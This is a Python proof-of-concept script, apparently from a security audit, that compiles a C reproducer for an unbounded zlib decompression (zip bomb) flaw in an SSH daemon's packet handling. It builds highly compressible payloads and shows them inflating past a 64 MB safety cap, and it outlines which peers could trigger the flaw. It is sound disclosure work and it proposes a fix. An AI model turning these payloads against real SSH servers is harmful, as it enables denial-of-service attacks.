#!/usr/bin/env python3
"""
PoC #8 — Unbounded Decompression in uncompress_buffer() (Zip Bomb)
===================================================================
Finding : MEDIUM  (README-sshd-security-flaws.md #17)
File    : packet.c:777-822
Branch  : master

Vulnerability
-------------
uncompress_buffer() inflates zlib data in a tight loop, appending output
to a dynamically-growing sshbuf with no limit on total output size:

    for (;;) {
        ssh->state->compression_in_stream.next_out = buf;        // 4096 B
        ssh->state->compression_in_stream.avail_out = sizeof(buf);
        status = inflate(..., Z_SYNC_FLUSH);
        switch (status) {
        case Z_OK:
            sshbuf_put(out, buf, sizeof(buf) - ...avail_out);   // no cap!
            break;
        case Z_BUF_ERROR:
            return 0;   // only exit: zlib says "done"
        ...
        }
    }

Incoming encrypted packets are capped at PACKET_MAX_SIZE = 256 KB
(packet.c:106).  But that limit applies to the *compressed* ciphertext.
A 256 KB maximally-compressible payload decompresses to hundreds of
megabytes — enough to exhaust process memory with a single packet.

Attack window
-------------
  * COMP_ZLIB (legacy, negotiated in KEXINIT):
    Compression active immediately after NEWKEYS — no authentication needed.
    Attacker: unauthenticated remote client.

  * COMP_DELAYED / zlib@openssh.com (default in OpenSSH):
    Compression active only after authentication succeeds.
    Attacker: a legitimately-authenticated user.

This PoC compiles a C reproducer that mirrors the uncompress_buffer() loop
and demonstrates the expansion of maximally-compressed inputs.
"""

import os
import sys
import subprocess
import tempfile

# Safety cap used in the PoC to avoid exhausting test-machine RAM.
# Real packet.c has NO cap — remove POC_SAFE_LIMIT to reproduce full OOM.
POC_SAFE_LIMIT_MB = 64

C_REPRODUCER = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <stdint.h>

/* Same constants as packet.c */
#define PACKET_MAX_SIZE   (256 * 1024)
#define INFLATE_CHUNK     4096            /* same as buf[4096] in packet.c:780 */

/* Safety cap for the PoC — real uncompress_buffer() has no such limit */
#define POC_SAFE_LIMIT    (64ULL * 1024 * 1024)   /* 64 MB */

/*
 * Direct mirror of uncompress_buffer() from packet.c:777-822.
 * The only difference: we count output bytes and optionally stop at
 * POC_SAFE_LIMIT.  Real code has no stopping condition other than Z_BUF_ERROR.
 */
static int
uncompress_loop(const unsigned char *in, size_t inlen,
    int apply_poc_cap, long long *out_bytes_p)
{
    z_stream z;
    unsigned char buf[INFLATE_CHUNK];
    int status;
    long long out_bytes = 0;

    memset(&z, 0, sizeof(z));
    if (inflateInit(&z) != Z_OK)
        return -1;

    z.next_in  = (unsigned char *)in;
    z.avail_in = (uInt)inlen;

    for (;;) {
        /* --- identical to packet.c:793-794 --- */
        z.next_out  = buf;
        z.avail_out = INFLATE_CHUNK;

        status = inflate(&z, Z_SYNC_FLUSH);

        switch (status) {
        case Z_OK:
            /* packet.c:800-802: sshbuf_put(out, buf, ...) — NO size check */
            out_bytes += INFLATE_CHUNK - z.avail_out;

            if (apply_poc_cap && (uint64_t)out_bytes >= POC_SAFE_LIMIT) {
                inflateEnd(&z);
                *out_bytes_p = out_bytes;
                return 1;   /* PoC cap reached; real code would continue */
            }
            break;

        case Z_BUF_ERROR:
            /* packet.c:810: only natural exit from the loop */
            inflateEnd(&z);
            *out_bytes_p = out_bytes;
            return 0;

        case Z_DATA_ERROR:
        case Z_MEM_ERROR:
        case Z_STREAM_ERROR:
        default:
            inflateEnd(&z);
            return -1;
        }
    }
}

/*
 * Build a maximally-compressible payload of plain_len bytes (all zeros),
 * compress it, and return the compressed buffer.
 */
static int
build_bomb(size_t plain_len, unsigned char **comp_out, size_t *comp_len_out)
{
    unsigned char *plain;
    unsigned char *comp;
    uLongf clen;

    plain = calloc(1, plain_len);           /* all zeros = maximally compressible */
    if (!plain)
        return 0;
    clen  = compressBound((uLong)plain_len);
    comp  = malloc(clen);
    if (!comp) { free(plain); return 0; }

    if (compress2(comp, &clen, plain, (uLong)plain_len, Z_BEST_COMPRESSION)
            != Z_OK) {
        free(plain); free(comp);
        return 0;
    }
    free(plain);
    *comp_out     = comp;
    *comp_len_out = (size_t)clen;
    return 1;
}

int
main(void)
{
    /* Plain sizes to test */
    static const size_t plain_sizes[] = {
        1UL   * 1024 * 1024,   /*   1 MB */
        10UL  * 1024 * 1024,   /*  10 MB */
        64UL  * 1024 * 1024,   /*  64 MB */
        256UL * 1024 * 1024,   /* 256 MB */
        512UL * 1024 * 1024,   /* 512 MB */
        0,
    };

    printf("=== PoC #8: uncompress_buffer() zip bomb (packet.c:777) ===\n\n");
    printf("PACKET_MAX_SIZE (incoming packet cap) = %d bytes (%d KB)\n",
           PACKET_MAX_SIZE, PACKET_MAX_SIZE / 1024);
    printf("POC_SAFE_LIMIT  (PoC only)            = %llu bytes (%llu MB)\n\n",
           (unsigned long long)POC_SAFE_LIMIT,
           (unsigned long long)POC_SAFE_LIMIT / (1024 * 1024));

    printf("%-12s  %-16s  %-8s  %-10s  %s\n",
           "Plain size", "Compressed size", "Fits?", "Ratio", "Notes");
    printf("%-12s  %-16s  %-8s  %-10s  %s\n",
           "──────────", "──────────────", "──────", "────────", "─────");

    for (int i = 0; plain_sizes[i] != 0; i++) {
        size_t plain_len = plain_sizes[i];
        unsigned char *comp = NULL;
        size_t clen = 0;

        if (!build_bomb(plain_len, &comp, &clen)) {
            printf("  (allocation failed for %zu MB plain)\n",
                   plain_len / (1024 * 1024));
            continue;
        }

        int fits = (clen <= PACKET_MAX_SIZE);
        double ratio = (double)plain_len / (double)clen;

        printf("%-12zu  %-16zu  %-8s  %-10.0fx  ",
               plain_len, clen, fits ? "YES <--" : "no", ratio);

        if (fits) {
            printf("runs in uncompress_buffer → ");
            long long got = 0;
            int rc = uncompress_loop(comp, clen, 1 /* apply cap */, &got);
            if (rc == 0) {
                printf("finished, output = %lld bytes\n", got);
            } else if (rc == 1) {
                printf("[+] STILL INFLATING at PoC cap (%lld MB output)\n"
                       "             Real sshd has no cap — would exhaust RAM.\n",
                       got / (1024LL * 1024));
            } else {
                printf("inflate error\n");
            }
        } else {
            printf("exceeds PACKET_MAX_SIZE, would be rejected before decompression\n");
        }
        free(comp);
    }

    printf("\n");
    printf("[*] Summary\n");
    printf("    uncompress_buffer() (packet.c:777) has no output size limit.\n");
    printf("    Any compressed packet that fits within PACKET_MAX_SIZE (%d KB)\n",
           PACKET_MAX_SIZE / 1024);
    printf("    can decompress to arbitrarily large output, limited only by\n");
    printf("    available process memory.\n\n");
    printf("    Attack requires compression to be negotiated:\n");
    printf("      COMP_ZLIB            -> after NEWKEYS (unauthenticated peer)\n");
    printf("      COMP_DELAYED (default) -> after authentication\n\n");
    printf("    Fix: track total output in the inflate loop; return\n");
    printf("    SSH_ERR_INVALID_FORMAT if it exceeds PACKET_MAX_SIZE * N.\n");

    return 0;
}
"""


def main():
    print("=" * 60)
    print("PoC #8 — Zip bomb in uncompress_buffer() (packet.c:777)")
    print("=" * 60)
    print()
    print("[*] This PoC compiles a C reproducer that mirrors the")
    print("    uncompress_buffer() inflate loop and shows the expansion")
    print("    ratio achievable within the 256 KB packet size limit.")
    print()
    print(f"[*] A safety cap of {POC_SAFE_LIMIT_MB} MB is applied in the PoC.")
    print("    Real packet.c has no cap at all.")
    print()

    with tempfile.TemporaryDirectory() as tmpdir:
        src  = os.path.join(tmpdir, "poc8.c")
        bin_ = os.path.join(tmpdir, "poc8")

        with open(src, "w") as f:
            f.write(C_REPRODUCER)

        r = subprocess.run(
            ["cc", "-O2", "-o", bin_, src, "-lz", "-Wall", "-Wextra"],
            capture_output=True, text=True,
        )
        if r.returncode != 0:
            print(f"[!] Compilation failed:\n{r.stderr}")
            sys.exit(1)
        print("[*] Compiled reproducer OK")
        print()

        r = subprocess.run([bin_], capture_output=True, text=True)
        print(r.stdout)
        if r.stderr:
            print(r.stderr, file=sys.stderr)


if __name__ == "__main__":
    main()
